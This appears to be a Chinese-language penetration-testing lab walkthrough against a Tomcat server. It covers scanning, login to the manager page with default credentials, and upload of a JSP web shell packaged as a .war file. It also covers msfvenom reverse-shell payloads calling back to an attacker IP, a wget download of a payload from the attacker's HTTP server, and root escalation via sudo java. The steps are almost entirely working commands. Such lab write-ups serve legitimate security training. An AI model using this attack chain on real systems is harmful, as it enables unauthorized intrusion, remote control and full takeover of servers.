# Tomcat漏洞

# 1.信息收集

## 1.1 主机发现

```
netdiscover
```

目标IP地址

```
192.168.81.151
```

![image-20220325085211797](https://gitee.com/xxb667/img/raw/master/img/image-20220325085211797.png)

## 1.2 端口扫描

```
masscan --rate=1000 -p 0-65535 192.168.81.151
```

收集到有两个端口是开放的

```
22
8080
```

![image-20220325085445785](https://gitee.com/xxb667/img/raw/master/img/image-20220325085445785.png)

## 1.3 端口服务识别

```
nmap -sV -T4 -O 192.168.81.151 -p 22,8080
```

可以看到

- 22端口：ssh服务
- 8080端口：http服务

![image-20220325085629890](https://gitee.com/xxb667/img/raw/master/img/image-20220325085629890.png)

直接进入8080端口，发现服务器版本信息

```
http://192.168.81.151:8080/
```

![image-20220325093428273](https://gitee.com/xxb667/img/raw/master/img/image-20220325093428273.png)

## 1.4 御剑扫描

```
192.168.81.151:8080
```

扫描到的网址

```
http://192.168.81.151:8080/manager
```

![image-20220325090210796](https://gitee.com/xxb667/img/raw/master/img/image-20220325090210796.png)

打开网址，打开网址的时候会弹出一个登录窗体

```
http://192.168.81.151:8080/manager
```

![image-20220325090441522](https://gitee.com/xxb667/img/raw/master/img/image-20220325090441522.png)

默认密码为

```
账户：tomcat
密码：tomcat
```

登录之后我们就进入了管理员界面

![image-20220325093726847](https://gitee.com/xxb667/img/raw/master/img/image-20220325093726847.png)



# 2.漏洞探测

2.1 文件上传漏洞

从管理员界面我们可以看到一个可以上传文件的地方

但只能上传.war结尾的文件

![image-20220325095056068](https://gitee.com/xxb667/img/raw/master/img/image-20220325095056068.png)

## 2.1 蚁剑连接

### 2.1.1 木马文件生成

用中国蚁剑中的插件进行生成

- 在蚁剑连接过的网络中，点击鼠标【右键】--【加载插件】--【默认分类】
- 可以看到里面有两个生成Shell的功能
- 任选其一即可

在这里我选择了【生成Shell】

在这里我们选择生成【JSP】格式的Shell

![image-20220112183844770](https://gitee.com/xxb667/img/raw/master/img/image-20220112183844770.png)

点击之后

- 弹出一个可以设置密码的文本框，里面有一个随机生成的密码

- 可以自定义修改密码

- 这里我修改成了**xxb**


![image-20220112184011888](https://gitee.com/xxb667/img/raw/master/img/image-20220112184011888.png)

生成的Shell如下

- 按住 【Ctrl+A】全选
- 【Ctrl+C】进行复制
- 然后【Ctr+V】粘贴到文本文件中
- 把后缀改为.jsp即可生成Shell文件

![image-20220112184144320](https://gitee.com/xxb667/img/raw/master/img/image-20220112184144320.png)

生成的文件名为 xxb.jsp

### 2.1.2 部署war包

把刚才生成的文件进行压缩

压缩后把压缩后的文件后缀改为 **.war**

![image-20220325105407066](https://gitee.com/xxb667/img/raw/master/img/image-20220325105407066.png)

上传包含.jsp文件的war文件

![image-20220325095839562](https://gitee.com/xxb667/img/raw/master/img/image-20220325095839562.png)

### 2.1.3 查看文件位置

在**Applications**中可以看到我们刚才上传的木马文件

- 而我们的木马文件则在这个目录下面
- 也就是我们刚才.war的文件名 **xxb**下面
- 再加上我们刚才生成的.jsp的这个文件名
- 就构造了我们可以用蚁剑进行连接的URL

![image-20220325095757196](https://gitee.com/xxb667/img/raw/master/img/image-20220325095757196.png)

### 2.1.4 蚁剑连接

```
http://192.168.81.151:8080/xxb/xxb.jsp
```

连接成功

![image-20220325100017190](https://gitee.com/xxb667/img/raw/master/img/image-20220325100017190.png)

查看一下我们上传的文件路径

```
find / -name xxb.war
```

路径为：

```
/usr/local/tomcat9/webapps/xxb.war
```

```
cd /usr/local/tomcat9/webapps
```

![image-20220325100358988](https://gitee.com/xxb667/img/raw/master/img/image-20220325100358988.png)

## 2.2 MSF直接反弹

### 2.2.1 使用MSF生成war包

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.81.131 LPORT=4444 -f war > shell.war
```

通过我们进入的管理员界面进行文件上传

把生成的文件拖到物理机上进行上传

文件名为：

```
shell.war
```

![image-20220325110615871](https://gitee.com/xxb667/img/raw/master/img/image-20220325110615871.png)

上传文件

![image-20220325110808291](https://gitee.com/xxb667/img/raw/master/img/image-20220325110808291.png)

找到执行的文件路径为

```
http://192.168.81.151:8080/shell
```

![image-20220325110954485](https://gitee.com/xxb667/img/raw/master/img/image-20220325110954485.png)

### 2.2.2 msf反弹shell

kali设置监听

```
msfconsole
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 192.168.81.131
set LPORT 4444
exploit
```

执行我们刚才上传的war包

访问war包文件名目录

```
http://192.168.81.151:8080/shell
```

![image-20220325111449811](https://gitee.com/xxb667/img/raw/master/img/image-20220325111449811.png)

输入

```
shell
```

直接getshell

获得shell之后直接进行第4个提权即可



# 3.getshell

## 3.1 上传木马文件

MSF生成木马文件，木马文件名为

**4444.elf**

```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.81.131 lport=4444 -f elf  >4444.elf
```

![image-20220325101302437](https://gitee.com/xxb667/img/raw/master/img/image-20220325101302437.png)

## 3.2 kali监听

在目录**home/xxb**创建**linux.rc**文件，并添加下列内容

```
vim linux.rc  #创建文件
```

添加的内容如下

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.81.131
set LPORT 4444
exploit
```

![image-20220318151533016](https://gitee.com/xxb667/img/raw/master/img/image-20220318151533016.png)

服务端监听，监听后在蚁剑上运行我们上传的木马文件

```
msfconsole  -qr /home/xxb1/linux.rc 
```

蚁剑运行木马文件

```
chmod +x 4444.elf
./4444.elf
```

![image-20220325101520823](https://gitee.com/xxb667/img/raw/master/img/image-20220325101520823.png)

## 3.3 获得shell

```
shell
```

![image-20220325101707728](https://gitee.com/xxb667/img/raw/master/img/image-20220325101707728.png)

## 3.4 切换终端

获取shell后，切换python终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20220325102000605](https://gitee.com/xxb667/img/raw/master/img/image-20220325102000605.png)

使用

```
sudo -l
```

命令时

- 可以看到靶机sudo权限可以执行的命令
- 可以看到sudo权限可以执行java

# 4.提权

## 4.1 生成jar包

在目录 **home/xxb1** 用MSF生成一个**jar**包

```
msfvenom —platform java -f jar -p java/shell_reverse_tcp LHOST=192.168.81.131 LPORT=7777 -o payload.jar
```

![image-20220325103623313](https://gitee.com/xxb667/img/raw/master/img/image-20220325103623313.png)

在目录 **home/xxb1** 开启临时服务器

```
python2 -m SimpleHTTPServer 1234 
```

![image-20220325103654560](https://gitee.com/xxb667/img/raw/master/img/image-20220325103654560.png)

## 4.2 靶机下载

切换到我们刚才获得的shell界面

然后执行下列命令

```
wget http://192.168.81.131:1234/payload.jar
```

已经成功下载文件

![image-20220325103920953](https://gitee.com/xxb667/img/raw/master/img/image-20220325103920953.png)

**注意**

- 若下载不成功

- 则切换文件目录到 **/usr/local/tomcat9/webapps**

- 命令

- ```
  cd /usr/local/tomcat9/webapps
  ```

- 然后再进行下载就可以了



## 4.3 MSF执行jar包

MSF进行监听

```
msfconsole
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 192.168.81.131
set LPORT 7777
exploit
```

切换到我们刚才获得的shell界面

执行jar包

```
sudo -u root java -jar payload.jar
```

![image-20220325104739357](https://gitee.com/xxb667/img/raw/master/img/image-20220325104739357.png)

返回MSF界面

已成功反弹新的shell

![image-20220325104911921](https://gitee.com/xxb667/img/raw/master/img/image-20220325104911921.png)



## 4.4 获取root权限

输入

```
id
```

查看当前用户权限为 root

![image-20220325105056818](https://gitee.com/xxb667/img/raw/master/img/image-20220325105056818.png)

